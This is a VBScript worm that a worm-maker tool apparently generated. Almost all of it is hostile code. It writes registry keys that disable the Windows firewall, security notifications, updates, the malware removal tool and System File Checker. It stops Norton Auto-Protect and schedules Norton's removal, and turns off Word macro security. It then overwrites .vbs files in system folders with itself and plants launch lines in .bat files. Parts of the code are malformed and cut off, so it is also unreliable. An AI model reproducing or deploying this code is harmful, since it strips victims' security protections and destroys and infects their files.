On Error Resume Next

' las By ANUBIS V1.5
'Generated With OXY'S Internet Worm Maker Thing V4.00
'
'These default variables might not be needed by the worm!

set fso=CreateObject("Scripting.FileSystemObject")
set shell=CreateObject("Wscript.Shell")


Shell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
Shell.regwrite "HKCU\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKCU\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKCU\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKLM\Software\Microsoft\Security Center\FirewallDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKLM\Software\Microsoft\Security Center\UpdatesDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKLM\Software\Microsoft\Security Center\AntiVirusDisableNotify", "1", "REG_DWORD"
Shell.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD"
Shell.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\EnableFirewall","0","REG_DWORD"
Shell.regwrite "HKCU\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD"
Shell.regwrite "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\EnableFirewall","0","REG_DWORD"
On Error Resume Next
AutoOff = "."
Set oWMI = "GetObject("winmgmts://.")"
AutoOffName = "Norton AntiVirus Auto-Protect Service"
sWQL = "Select state from Win32_Service " & "Where displayname='" & AutoOffName & "'"
Set oResults = "oWMI.ExecQuery(sWQL)"
For Each oService In oResults
oService.StopService
oService.ChangeStartMode("Disabled")
Next
Const HKEY_LOCAL_MACHINE = &H80000002
Set Registry = "GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")"
KeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
ValueName = "Uninstall Norton Script Blocking"
arrStringValues = "("MSIEXEC /x {D327AFC9-7BAA-473A-8319-6EB7A0D40138} /Q")"
Registry.SetStringValue HKEY_LOCAL_MACHINE, KeyPath, ValueName,arrStringValues
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
 CommandBars("Macro").Controls("Security...").Enabled = False
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 CommandBars("Tools").Controls("Macro").Enabled = False
 Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Shell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate","1", "REG_DWORD"
Shell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableMalwareRemovalTool", "1", "REG_DWORD"
Shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SFCDisable","FFFFFF9D","REG_DWORD"
Shell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons"
Shell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons\C"
Shell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons\C\DefaultIcon"
Shell.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\DriveIcons\C\DefaultIcon\","C:\Users\Erubi\Downloads\Ultimate-RAT-Collection-main\Fade\Fade 1.0\icon\installer2.ico, 1", "REG_SZ"
Function Infect(path,extension)
On Error Resume Next
Set file = fso.OpenTextFile(WScript.ScriptFullName, 1)
ome = file.ReadAll
Set Folder = fso.GetFolder(path)
Set dir = Folder.Files
For each target in dir
Ext = fso.GetExtensionName(target.Name)
If Ext = extension then
Set W = fso.OpenTextFile(target.path, 2, True)
W.Write ome
W.Close
End If
Next
End Function
Set Net = CreateObject("WScript.Network")
Username = Net.Username
Call Infect("C:\","vbs")
Call Infect("C:\Windows","vbs")
Call Infect("C:\Windows\System32","vbs")
fso.CopyFile WScript.ScriptFullName, "C:\duccoformat
Function Infect(path)
Set Folder = fso.GetFolder(path)
Set dir = Folder.Files
For each target in dir
Ext = fso.GetExtensionName(target.Name)
If Ext = "bat" then
Set W = fso.OpenTextFile(target.path, 8, True)
W.Write VbCrLf
W.write "@start C:\ducco.vbs"
W.close
End If
Next
End Function
Call Infect("C:\")
Call Infect("C:\Windows")
Call Infect("C:\Windows\System32")
